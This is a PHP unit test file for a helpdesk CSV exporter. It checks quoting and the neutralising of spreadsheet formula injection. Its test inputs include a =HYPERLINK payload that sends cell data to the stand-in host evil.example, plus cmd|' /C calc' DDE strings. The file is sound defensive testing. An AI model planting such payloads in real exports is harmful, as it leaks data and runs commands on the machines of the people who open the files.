<?php

use Carbon\Carbon;
use Helpdesk\Reports\CsvExporter;

class CsvExporterTest extends TestCase {

	public function testWritesHeaderThenRows()
	{
		$csv = (new CsvExporter)->toCsv(array('a', 'b'), array(array('1', '2'), array('3', '4')));

		$this->assertSame("a,b\n1,2\n3,4\n", $csv);
	}

	public function testQuotesCommasAndDoublesQuotes()
	{
		$csv = (new CsvExporter)->toCsv(array('subject'), array(array('Printer, 2nd floor'), array('Says "paper jam"')));

		$this->assertSame("subject\n\"Printer, 2nd floor\"\n\"Says \"\"paper jam\"\"\"\n", $csv);

		$lines = array_map('str_getcsv', explode("\n", trim($csv)));
		$this->assertSame(array('Says "paper jam"'), $lines[2]);
	}

	public function testHeaderOnlyWhenThereAreNoRows()
	{
		$this->assertSame("a,b\n", (new CsvExporter)->toCsv(array('a', 'b'), array()));
	}

	/**
	 * @dataProvider formulaTriggers
	 */
	public function testCellsStartingWithAFormulaCharacterArePrefixedWithAQuote($value)
	{
		$csv = (new CsvExporter)->toCsv(array('subject'), array(array($value)));
		$lines = str_getcsv(rtrim(substr($csv, strlen("subject\n")), "\n"));

		$this->assertSame("'".$value, $lines[0]);
	}

	public function formulaTriggers()
	{
		return array(
			array('=HYPERLINK("http://evil.example/?d="&A1,"click")'),
			array('+1+cmd|\' /C calc\'!A0'),
			array('-2+3'),
			array('@SUM(1+1)*cmd|\' /C calc\'!A0'),
			array("\t=1+1"),
			array("\r=1+1"),
		);
	}

	public function testOrdinaryTextIsUnchanged()
	{
		$csv = (new CsvExporter)->toCsv(array('subject'), array(array('Printer jam'), array('a=b'), array('Mail -> spam'), array('')));

		$this->assertSame("subject\n\"Printer jam\"\na=b\n\"Mail -> spam\"\n\n", $csv);
	}

	public function testHeaderCellsAreSanitisedToo()
	{
		$csv = (new CsvExporter)->toCsv(array('=cmd'), array());

		$this->assertSame("'=cmd\n", $csv);
	}

	public function testNumbersStayUnquotedNumbers()
	{
		$csv = (new CsvExporter)->toCsv(array('id', 'minutes', 'delta'), array(array(42, 12.5, -3)));

		$this->assertSame("id,minutes,delta\n42,12.5,-3\n", $csv);
	}

	public function testTicketFieldsFromUsersAreSanitised()
	{
		Artisan::call('migrate');

		$requester = User::create(array('username' => 'mallory', 'name' => '=HYPERLINK("http://evil.example","x")', 'email' => 'm@helpdesk.local', 'role' => 'requester', 'source' => 'local'));
		$category = Category::create(array('name' => '@Printing'));

		$ticket = new Ticket;
		$ticket->number = 'HD-000043';
		$ticket->subject = '+cmd|calc';
		$ticket->description = 'x';
		$ticket->status = 'open';
		$ticket->priority = 'high';
		$ticket->category_id = $category->id;
		$ticket->requester_id = $requester->id;
		$ticket->sla_state = 'ok';
		$ticket->created_at = Carbon::create(2014, 1, 6, 9, 0, 0);
		$ticket->save();

		$csv = (new CsvExporter)->tickets(Ticket::with('category', 'requester', 'assignee')->get());
		$row = str_getcsv(explode("\n", trim($csv))[1]);

		$this->assertSame("'+cmd|calc", $row[1]);
		$this->assertSame("'@Printing", $row[4]);
		$this->assertSame("'=HYPERLINK(\"http://evil.example\",\"x\")", $row[5]);
	}

	public function testTicketRows()
	{
		Artisan::call('migrate');

		$requester = User::create(array('username' => 'carol', 'name' => 'Carol', 'email' => 'carol@helpdesk.local', 'role' => 'requester', 'source' => 'local'));
		$category = Category::create(array('name' => 'Printing'));

		$ticket = new Ticket;
		$ticket->number = 'HD-000042';
		$ticket->subject = 'Toner, black';
		$ticket->description = 'x';
		$ticket->status = 'open';
		$ticket->priority = 'high';
		$ticket->category_id = $category->id;
		$ticket->requester_id = $requester->id;
		$ticket->sla_state = 'warning';
		$ticket->created_at = Carbon::create(2014, 1, 6, 9, 0, 0);
		$ticket->first_responded_at = Carbon::create(2014, 1, 6, 9, 10, 0);
		$ticket->save();

		$csv = (new CsvExporter)->tickets(Ticket::with('category', 'requester', 'assignee')->get());
		$lines = explode("\n", trim($csv));

		$this->assertSame(CsvExporter::$ticketHeader, str_getcsv($lines[0]));
		$this->assertSame(
			'HD-000042,"Toner, black",open,high,Printing,Carol,,"2014-01-06 09:00:00","2014-01-06 09:10:00",,warning',
			$lines[1]
		);
	}

}
